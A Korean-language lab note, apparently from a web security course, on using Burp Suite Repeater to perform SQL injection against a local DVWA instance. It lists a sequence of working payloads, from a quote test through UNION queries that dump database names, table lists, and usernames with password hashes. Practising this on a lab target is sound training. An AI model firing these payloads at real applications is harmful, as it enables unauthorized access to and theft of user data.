# Day 2 — Burp Suite Repeater 활용

> Repeater로 HTTP 요청을 수동으로 수정·재전송해서 SQLi를 직접 공격해본다

---

## Repeater란?

ZAP이 **자동**으로 취약점을 찾아줬다면,
Repeater는 **내가 직접** 페이로드를 넣고 응답을 확인하는 도구.

```
브라우저 → Burp Proxy → 요청 가로채기
                ↓
           Repeater로 전송
                ↓
      페이로드 수정 → Send → 응답 확인
```

---

## 실습 준비

### 1. Burp Suite 프록시 설정
- Burp Suite 실행
- Proxy → Options → 127.0.0.1:8080 확인
- 브라우저 프록시: 127.0.0.1:8080 (Burp 내장 브라우저 사용 권장)

### 2. DVWA 보안 레벨 Low로 설정
- `http://localhost:8081` 접속
- admin / password 로그인
- DVWA Security → Security Level: **Low** → Submit

---

## 실습 1 — 요청 가로채서 Repeater로 보내기

### Step 1. Proxy Intercept ON
- Burp → Proxy → Intercept → **Intercept is on**

### Step 2. DVWA SQL Injection 페이지 접속
- `http://localhost:8081/vulnerabilities/sqli/`
- User ID 입력창에 `1` 입력 → Submit

### Step 3. 가로챈 요청 Repeater로 전송
- Proxy 탭에서 요청 확인
- 우클릭 → **Send to Repeater** (단축키: Ctrl+R)
- Intercept 끄기 (Intercept is off)

---

## 실습 2 — SQLi 페이로드 삽입

Repeater 탭으로 이동. 요청의 파라미터 부분을 수정해가며 Send.

### 기본 요청 (정상)
```
GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
```
→ 응답: `ID: 1 / First name: admin / Surname: admin`

### 페이로드 1 — 싱글쿼터 테스트
```
id=1'
```
→ 응답에 SQL 에러 메시지 나오면 SQLi 취약!
```
You have an error in your SQL syntax...
```

### 페이로드 2 — 항상 참 조건
```
id=1' OR '1'='1
```
→ 모든 사용자 정보가 출력되면 성공

### 페이로드 3 — UNION으로 컬럼 수 파악
```
id=1' UNION SELECT 1,2-- -
```
→ 컬럼이 2개면 정상 응답, 다르면 에러
→ 응답에 `1`, `2` 숫자가 출력 위치에 보임

### 페이로드 4 — DB 정보 추출
```
id=1' UNION SELECT user(),database()-- -
```
→ DB 사용자명과 DB명이 응답에 출력됨
→ 예: `root@localhost` / `dvwa`

### 페이로드 5 — 테이블 목록 조회
```
id=1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- -
```
→ dvwa DB의 테이블 목록 출력

### 페이로드 6 — users 테이블 데이터 덤프
```
id=1' UNION SELECT user,password FROM users-- -
```
→ 유저명과 해시된 비밀번호 출력

---

## 응답 분석 포인트

| 확인 항목 | 의미 |
|-----------|------|
| SQL 에러 메시지 노출 | Error-based SQLi 가능 |
| 정상 응답 + 데이터 추가 출력 | UNION-based SQLi 성공 |
| 응답 길이 변화 | Boolean-based SQLi 가능성 |
| 응답 시간 지연 | Time-based SQLi 가능성 |

---

## 핵심 개념 정리

### UNION-based SQLi 조건
1. 원본 쿼리와 **컬럼 수가 같아야** 함
2. 각 컬럼의 **데이터 타입이 호환**되어야 함
3. 그래서 먼저 `UNION SELECT 1,2,3...`으로 컬럼 수 파악

### 주석 처리 방법
| DB | 주석 |
|----|------|
| MySQL | `-- -` 또는 `#` |
| MSSQL | `--` |
| Oracle | `--` |

---

## Day 2 체크리스트

- [ ] Burp 프록시 설정 완료
- [ ] DVWA SQLi 요청 가로채기 성공
- [ ] Repeater로 전송 성공
- [ ] 싱글쿼터 테스트 → SQL 에러 확인
- [ ] `OR '1'='1` → 전체 유저 출력 확인
- [ ] UNION SELECT로 DB 정보 추출 성공
- [ ] users 테이블 데이터 덤프 성공
